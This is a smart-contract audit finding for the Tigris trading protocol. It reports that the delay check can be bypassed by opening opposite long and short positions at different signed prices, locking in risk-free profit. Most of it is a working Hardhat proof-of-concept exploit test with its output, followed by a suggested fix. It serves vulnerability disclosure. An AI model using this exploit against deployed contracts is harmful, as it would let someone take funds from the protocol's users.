## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- selected for report
- sponsor disputed
- edited-by-warden
- M-03

# [Bypass the delay security check to win risk free funds](https://github.com/code-423n4/2022-12-tigris-findings/issues/108) 

# Lines of code

https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L857-L868


# Vulnerability details

## Impact
The current implementation uses ````_checkDelay()```` function to prevent profitable opening and closing in the same tx with two different prices in the "valid signature pool". But the protection is not enough, an attacker can long with low price and short with high price at the same tx but two orders to lock profit and take risk free funds.

## Proof of Concept
The following test case and comments show the details for how to exploit it
```
const { expect } = require("chai");
const { deployments, ethers, waffle } = require("hardhat");
const { parseEther, formatEther } = ethers.utils;
const { signERC2612Permit } = require('eth-permit');

describe("Bypass delay check to earn risk free profit", function () {

  let owner;
  let node;
  let user;
  let node2;
  let node3;
  let proxy;

  let Trading;
  let trading;

  let TradingExtension;
  let tradingExtension;

  let TradingLibrary;
  let tradinglibrary;

  let StableToken;
  let stabletoken;

  let StableVault;
  let stablevault;

  let position;

  let pairscontract;
  let referrals;

  let permitSig;
  let permitSigUsdc;

  let MockDAI;
  let MockUSDC;
  let mockusdc;

  let badstablevault;

  let chainlink;

  beforeEach(async function () {
    await deployments.fixture(['test']);
    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();
    StableToken = await deployments.get("StableToken");
    stabletoken = await ethers.getContractAt("StableToken", StableToken.address);
    Trading = await deployments.get("Trading");
    trading = await ethers.getContractAt("Trading", Trading.address);
    TradingExtension = await deployments.get("TradingExtension");
    tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);
    const Position = await deployments.get("Position");
    position = await ethers.getContractAt("Position", Position.address);
    MockDAI = await deployments.get("MockDAI");
    MockUSDC = await deployments.get("MockUSDC");
    mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);
    const PairsContract = await deployments.get("PairsContract");
    pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);
    const Referrals = await deployments.get("Referrals");
    referrals = await ethers.getContractAt("Referrals", Referrals.address);
    StableVault = await deployments.get("StableVault");
    stablevault = await ethers.getContractAt("StableVault", StableVault.address);
    await stablevault.connect(owner).listToken(MockDAI.address);
    await stablevault.connect(owner).listToken(MockUSDC.address);
    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);
    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));
    await tradingExtension.connect(owner).setNode(node.address, true);
    await tradingExtension.connect(owner).setNode(node2.address, true);
    await tradingExtension.connect(owner).setNode(node3.address, true);
    await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);
    await network.provider.send("evm_mine");
    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);
    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);

    const BadStableVault = await ethers.getContractFactory("BadStableVault");
    badstablevault = await BadStableVault.deploy(StableToken.address);

    const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");
    chainlink = await ChainlinkContract.deploy();

    TradingLibrary = await deployments.get("TradingLibrary");
    tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);
    await trading.connect(owner).setLimitOrderPriceRange(1e10);
  });


  describe("Simulate long with low price and short with high price at the same tx to lock profit", function () {
    let longId;
    let shortId;
    beforeEach(async function () {
        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];
        let PriceData = [node.address, 1, parseEther("1000"), 0, 2000000000, false];
        let message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [node.address, 1, parseEther("1000"), 0, 2000000000, false]
          )
        );
        let sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        );
        
        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
        longId = await position.getCount();
        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
        expect(await position.assetOpenPositionsLength(1)).to.equal(1);

        TradeInfo = [parseEther("1010"), MockDAI.address, StableVault.address, parseEther("10"), 1, false, parseEther("0"), parseEther("0"), ethers.constants.HashZero];
        PriceData = [node.address, 1, parseEther("1010"), 0, 2000000000, false];
        message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [node.address, 1, parseEther("1010"), 0, 2000000000, false]
          )
        );
        sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        );
        
        PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
        shortId = await position.getCount();
        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
        expect(await position.assetOpenPositionsLength(1)).to.equal(2);
  
    });


    it.only("Exit at any price to take profit", async function () {
        // same time later, now we can close the orders
        await network.provider.send("evm_setNextBlockTimestamp", [2000000100]);
        await network.provider.send("evm_mine");

        // any new price, can be changed to other price such as 950, just ensure enough margin
        let closePrice = parseEther("1050");
        let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];
        let closeMessage = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [node.address, 1, closePrice, 0, 2000000100, false]
          )
        );
        let closeSig = await node.signMessage(
          Buffer.from(closeMessage.substring(2), 'hex')
        );
        
        let balanceBefore = await stabletoken.balanceOf(owner.address);
        await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
        await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
        let balanceAfter = await stabletoken.balanceOf(owner.address);
        let principal = parseEther("1000").add(parseEther("1010"));

        let profit = balanceAfter.sub(balanceBefore).sub(principal);
        expect(profit.gt(parseEther(`50`))).to.equal(true);
    });

    it.only("Exit with another price pair to double profit", async function () {
      // some time later, now we can close the orders
      await network.provider.send("evm_setNextBlockTimestamp", [2000000100]);
      await network.provider.send("evm_mine");

      // any new price pair, can be changed to other price such as (950, 960), just ensure enough margin
      let closePrice = parseEther("1050");
      let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];
      let closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000000100, false]
        )
      );
      let closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );
      
      let balanceBefore = await stabletoken.balanceOf(owner.address);

      // close long with high price
      await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);


      closePrice = parseEther("1040");
      closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];
      closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000000100, false]
        )
      );
      closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );
      // close short with low price
      await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
      let balanceAfter = await stabletoken.balanceOf(owner.address);
      let principal = parseEther("1000").add(parseEther("1010"));

      let profit = balanceAfter.sub(balanceBefore).sub(principal);
      expect(profit.gt(parseEther(`100`))).to.equal(true);
    });

  });
});


```

How to run
Put the test case to a new BypassDelayCheck.js file of test directory, and run
```
npx hardhat test
```

And the test result will be
```
  Bypass delay check to earn risk free profit
    Simulate long with low price and short with high price at the same tx to lock profit
      √ Exit at any price to take profit
      √ Exit with another price pair to double profit
```

## Tools Used
VS Code, hardhat

## Recommended Mitigation Steps
Cache recent lowest and highest prices, open long order with the highest price and short order with the lowest price.